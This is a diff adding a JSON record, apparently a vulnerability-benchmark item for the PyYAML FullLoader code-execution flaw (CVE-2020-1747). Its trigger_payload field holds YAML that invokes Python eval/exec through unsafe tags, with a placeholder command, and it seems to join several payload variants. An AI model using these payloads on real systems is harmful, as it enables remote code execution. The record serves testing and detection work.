@@ -1,0 +1,15 @@
+{
+  "file_id": "232_pyyaml_issue_420",
+  "numeric_id": "232",
+  "library_hint": "pyyaml",
+  "source": "github_issue",
+  "title": "PyYAML's FullLoader remains vulnerable to arbitrary code execution via unsafe YAML tags",
+  "cve": "CVE-2020-1747",
+  "cwe": "CWE-94: Improper Control of Generation of Code ('Code Injection')",
+  "library": "pyyaml",
+  "affected_version": ">= 5.0, < 5.3.1",
+  "vulnerable_function": ".load()",
+  "triggerability": "indirect",
+  "trigger_payload": "!!python/object/new:tuple\n- !!python/object/new:map\n- !!python/name:eval\n- [ \"RCE_HERE\" ]\n!!python/object/new:type\nargs: [\"z\", !!python/tuple [], {\"extend\": !!python/name:exec }]\nlistitems: \"RCE_HERE\"\n- !!python/object/new:str\nargs: []\nstate: !!python/tuple\n- \"RCE_HERE\"\n- !!python/object/new:staticmethod\nargs: [0]\nstate:\nupdate: !!python/name:exec",
+  "oracle": "arbitrary code execution"
+}
